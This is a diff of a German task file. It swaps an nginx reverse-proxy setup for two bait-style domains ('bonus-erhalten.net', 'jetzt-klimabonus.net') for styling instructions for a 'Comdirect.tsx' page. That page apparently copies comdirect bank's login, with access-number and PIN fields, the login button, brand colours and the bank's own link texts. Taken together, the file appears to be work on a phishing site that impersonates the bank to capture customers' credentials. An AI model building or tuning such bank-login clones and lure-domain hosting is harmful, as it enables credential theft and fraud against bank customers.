@@ -1,40 +1,23 @@
-# Ein Copy-and-paste-Befehl
+# Comdirect Feinschliff: Labels, Anmelden-Button, Link-Underline, Teaser-Höhe
 
-Diesen gesamten Block **auf einmal** in PuTTY einfügen:
+Nur `src/pages/Comdirect.tsx` wird angepasst.
 
-```bash
-sudo tee /etc/nginx/sites-available/net-domains-ssl >/dev/null <<'EOF'
-server {
-    listen 443 ssl;
-    server_name bonus-erhalten.net;
+## Eingabefelder (Zugangsnummer, PIN)
+- Floating-Label im Ruhezustand (nicht fokussiert, leer): Farbe `rgb(11, 30, 37)`.
+- Floating-Label im gefloateten/aktiven Zustand (oben, verkleinert): Farbe `rgba(11, 30, 37, 1.0)`.
 
-    ssl_certificate /etc/letsencrypt/live/bonus-erhalten.net/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/bonus-erhalten.net/privkey.pem;
+## Anmelden-Button
+- Textfarbe `#0B1E25`.
+- Schriftgröße minimal größer (ca. +1–2 px).
 
-    location / {
-        proxy_pass http://91.215.85.163:8080;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto https;
-    }
-}
+## Link-Underline Abstand
+- Bei „Information zum Login · Login vergessen / gesperrt?" und
+  „Kostenfreie Registrierung als comdirect Member inkl. Musterdepot und Community"
+  den Abstand zwischen Text und Underline minimal vergrößern
+  (`text-underline-offset` leicht erhöhen, z.B. auf ~4px).
 
-server {
-    listen 443 ssl;
-    server_name jetzt-klimabonus.net;
+## Teaser-Card „Dein Zukunfts-Ich"
+- Card ist aktuell zu flach: Tiefe (Höhe) um 25% erhöhen.
+- Bildhöhe entsprechend anheben (aktuell `h-[110px]` → ~`h-[138px]`), Text-Padding leicht mitwachsen.
 
-    ssl_certificate /etc/letsencrypt/live/jetzt-klimabonus.net/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/jetzt-klimabonus.net/privkey.pem;
-
-    location / {
-        proxy_pass http://91.215.85.131:8080;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto https;
-    }
-}
-EOF
-sudo ln -sf /etc/nginx/sites-available/net-domains-ssl /etc/nginx/sites-enabled/net-domains-ssl && sudo nginx -t && sudo systemctl reload nginx
-```
+Sonst nichts ändern.
